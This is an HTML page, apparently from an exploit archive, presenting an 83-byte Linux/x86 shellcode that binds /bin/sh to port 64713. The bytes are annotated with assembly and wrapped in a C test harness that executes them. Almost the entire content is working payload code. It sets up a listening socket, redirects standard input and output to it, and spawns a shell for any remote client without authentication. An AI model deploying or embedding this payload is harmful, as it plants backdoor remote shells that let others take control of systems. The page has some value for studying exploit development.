<html><head><title>Linux/x86 - portbind /bin/sh (port 64713) - 83 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) portbind /bin/sh (port 64713)
 * 83 bytes
 * 
 * http://www.gonullyourself.org
 * sToRm &lt;hixmostorm@hotmail.com&gt;
 */

char shellcode[] =
                                // &lt;_start&gt;:
&quot;\x6a\x66&quot;                      // push   $0x66
&quot;\x58&quot;                          // pop    %eax
&quot;\x31\xdb&quot;                      // xor    %ebx,%ebx
&quot;\x53&quot;                          // push   %ebx
&quot;\x43&quot;                          // inc    %ebx
&quot;\x53&quot;                          // push   %ebx
&quot;\x6a\x02&quot;                      // push   $0x2
&quot;\x89\xe1&quot;                      // mov    %esp,%ecx
&quot;\xcd\x80&quot;                      // int    $0x80
&quot;\x31\xd2&quot;                      // xor    %edx,%edx
&quot;\x52&quot;                          // push   %edx
&quot;\x68\xff\x02\xfc\xc9&quot;          // push   $0xc9fc02ff
&quot;\x89\xe1&quot;                      // mov    %esp,%ecx
&quot;\x6a\x10&quot;                      // push   $0x10
&quot;\x51&quot;                          // push   %ecx
&quot;\x50&quot;                          // push   %eax
&quot;\x89\xe1&quot;                      // mov    %esp,%ecx
&quot;\x89\xc6&quot;                      // mov    %eax,%esi
&quot;\x43&quot;                          // inc    %ebx
&quot;\xb0\x66&quot;                      // mov    $0x66,%al
&quot;\xcd\x80&quot;                      // int    $0x80
&quot;\xb0\x66&quot;                      // mov    $0x66,%al
&quot;\x43&quot;                          // inc    %ebx
&quot;\x43&quot;                          // inc    %ebx
&quot;\xcd\x80&quot;                      // int    $0x80
&quot;\x50&quot;                          // push   %eax
&quot;\x56&quot;                          // push   %esi
&quot;\x89\xe1&quot;                      // mov    %esp,%ecx
&quot;\x43&quot;                          // inc    %ebx
&quot;\xb0\x66&quot;                      // mov    $0x66,%al
&quot;\xcd\x80&quot;                      // int    $0x80
&quot;\x93&quot;                          // xchg   %eax,%ebx
&quot;\x6a\x03&quot;                      // push   $0x3
&quot;\x59&quot;                          // pop    %ecx
                                // &lt;fruity_loops&gt;:
&quot;\x49&quot;                          // dec    %ecx
&quot;\x6a\x3f&quot;                      // push   $0x3f
&quot;\x58&quot;                          // pop    %eax
&quot;\xcd\x80&quot;                      // int    $0x80
&quot;\x75\xf8&quot;                      // jne    &lt;fruity_loops&gt;
&quot;\xf7\xe1&quot;                      // mul    %ecx
&quot;\x51&quot;                          // push   %ecx
&quot;\x68\x2f\x2f\x73\x68&quot;          // push   $0x68732f2f
&quot;\x68\x2f\x62\x69\x6e&quot;          // push   $0x6e69622f
&quot;\x89\xe3&quot;                      // mov    %esp,%ebx
&quot;\xb0\x0b&quot;                      // mov    $0xb,%al
&quot;\xcd\x80&quot;                      // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf(&quot;Length: %u\n&quot;, strlen(shellcode));
    f();
    
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
